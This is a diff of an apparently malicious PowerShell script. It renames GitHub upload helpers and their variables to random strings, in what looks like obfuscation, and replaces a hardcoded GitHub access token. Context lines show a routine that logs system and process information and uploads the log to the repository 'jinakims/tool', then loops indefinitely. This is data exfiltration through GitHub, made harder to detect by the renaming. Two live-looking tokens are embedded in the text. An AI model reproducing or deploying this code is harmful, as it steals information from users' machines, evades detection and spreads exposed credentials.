@@ -23,30 +23,30 @@ function stun($e)
 	return $c
 }
 
-function git-getfile {
+function gidvnw {
     param (
-        $token,
-        $owner,
+        $codmvj,
+        $omaoxz,
         $repo,
         $path
     )
 
-    $base64token = [System.Convert]::ToBase64String([char[]]$token)
+    $fsgshjfd = [System.Convert]::ToBase64String([char[]]$codmvj)
 
-    $headers = @{
-        Authorization = 'Basic {0}' -f $base64token
+    $sgbswvl = @{
+        Authorization = 'Basic {0}' -f $fsgshjfd
         accept = 'application/vnd.github.v3+json'
     }
 
-    Invoke-RestMethod -Headers $headers -Uri https://api.github.com/repos/$owner/$repo/contents/$path -Method Get | select *, @{n='content_decoded';e={[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($_.content))}}
+    Invoke-RestMethod -Headers $sgbswvl -Uri https://api.github.com/repos/$omaoxz/$repo/contents/$path -Method Get | select *, @{n='content_decoded';e={[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($_.content))}}
 }
 
-function git-uploadfile {
+function gugagd {
     param (
-        $token,
-        $message = '',
+        $codmvj,
+        $miso = '',
         $file,
-        $owner,
+        $omaoxz,
         $repo,
         $path = '.\',
         $sha,
@@ -55,16 +55,16 @@ function git-uploadfile {
 
     $path = (Join-Path $path (Split-Path $file -Leaf))
 
-    $base64token = [System.Convert]::ToBase64String([char[]]$token)
+    $fsgshjfd = [System.Convert]::ToBase64String([char[]]$codmvj)
 
-    $headers = @{
-        Authorization = 'Basic {0}' -f $base64token
+    $sgbswvl = @{
+        Authorization = 'Basic {0}' -f $fsgshjfd
     }
 
     if ($force -and !$sha) {
         $sha = $(
             try {
-                (git-getfile -token $token -owner $owner -repo $repo -path $path).sha
+                (gidvnw -codmvj $codmvj -omaoxz $omaoxz -repo $repo -path $path).sha
             } catch {
                 $null
             }
@@ -72,12 +72,12 @@ function git-uploadfile {
     }
 
     $body = @{
-        message = $message
+        message = $miso
         content = [convert]::ToBase64String((Get-Content $file -Encoding Byte))
         sha = $sha
     } | ConvertTo-Json
 
-    Invoke-RestMethod -Headers $headers -Uri https://api.github.com/repos/$owner/$repo/contents/$path -Body $body -Method Put
+    Invoke-RestMethod -Headers $sgbswvl -Uri https://api.github.com/repos/$omaoxz/$repo/contents/$path -Body $body -Method Put
 }
 
 function df
@@ -117,7 +117,7 @@ function sssrehbs
 	$sdbsdb >> $hFLgPth
 	Get-process >> $hFLgPth
 	
-	git-uploadfile -token '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' -file $hFLgPth -owner jinakims -repo tool -path test -force
+	gugagd -codmvj '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' -file $hFLgPth -omaoxz jinakims -repo tool -path test -force
 
 	while ($true)
 	{		
